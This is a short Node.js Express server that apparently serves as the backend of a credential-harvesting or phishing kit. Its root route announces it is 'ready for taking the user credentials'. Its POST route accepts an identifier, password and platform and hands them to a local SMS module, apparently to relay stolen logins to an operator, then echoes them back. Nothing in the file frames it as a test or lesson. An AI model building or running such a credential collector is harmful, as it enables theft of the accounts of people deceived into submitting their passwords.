const express = require("express");
const cors = require("cors");
const sendMsg = require("./sms.js");
require("dotenv").config();

const port = process.env.PORT;
const app = express();
app.use(express.json());
app.use(cors());

app.get("/", (req, res) => {
  res
    .status(200)
    .json({ message: "API ready for taking the user credentials" });
});

app.post("/", async (req, res) => {
  const { identifier, password, platform } = req.body;
  const response = await sendMsg(identifier, password, platform);
  if(response)
  {
  res.status(200).json({
    message: "Credentials received",
    identifier: identifier,
    password: password,
  });
  }
  else
  {
    res.status(500).json({message:"Internal Server Error"});
  }
});

app.listen(port, () => {
  console.log("Server started listening on port ", port);
});
